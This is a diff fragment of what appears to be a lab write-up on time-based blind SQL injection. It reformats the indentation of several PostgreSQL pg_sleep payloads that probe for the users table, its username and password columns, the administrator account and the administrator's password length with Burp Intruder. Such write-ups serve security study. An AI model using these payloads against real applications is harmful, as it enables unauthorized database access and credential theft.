@@ -36,25 +36,25 @@ In this laboratory, the initial objective was to cause a 10 second delay using S
 
 2. Verified that the application could process 'case when' expressions:
 
-"'||(select case when(1=1) then pg_sleep(3) else pg_sleep(0) end)--"
+   "'||(select case when(1=1) then pg_sleep(3) else pg_sleep(0) end)--"
 
 5. Verified existence of the target table 'users':
 
-"'||(select case when exists(select 1 from information_schema.tables where table_name='users') then pg_sleep(3) else pg_sleep(0) end)--"
+   "'||(select case when exists(select 1 from information_schema.tables where table_name='users') then pg_sleep(3) else pg_sleep(0) end)--"
 
 6. Verified existence of the target columns 'username' and 'password':
 
-"'||(select case when exists(select 1 from information_schema.columns where table_name='users' and column_name='username') then pg_sleep(3) else pg_sleep(0) end)--"
+   "'||(select case when exists(select 1 from information_schema.columns where table_name='users' and column_name='username') then pg_sleep(3) else pg_sleep(0) end)--"
 
-"'||(select case when exists(select 1 from information_schema.columns where table_name='users' and column_name='password') then pg_sleep(3) else pg_sleep(0) end)--"
+   "'||(select case when exists(select 1 from information_schema.columns where table_name='users' and column_name='password') then pg_sleep(3) else pg_sleep(0) end)--"
 
 7. Verified existence of the administrator user:
 
-"||(select case when exists(select username from users where username = 'administrator') then pg_sleep(3) else pg_sleep(0) end)--"
+   "||(select case when exists(select username from users where username = 'administrator') then pg_sleep(3) else pg_sleep(0) end)--"
 
 8. Verified password length by Intruder in Burp:
 
-"'||(select case when exists(select password from users where username='administrator' and length(password)=§20§) then pg_sleep(2) else pg_sleep(0) end)--"
+   "'||(select case when exists(select password from users where username='administrator' and length(password)=§20§) then pg_sleep(2) else pg_sleep(0) end)--"
 
 Payload type -> Numbers from 1 to 50 step by 1.
 
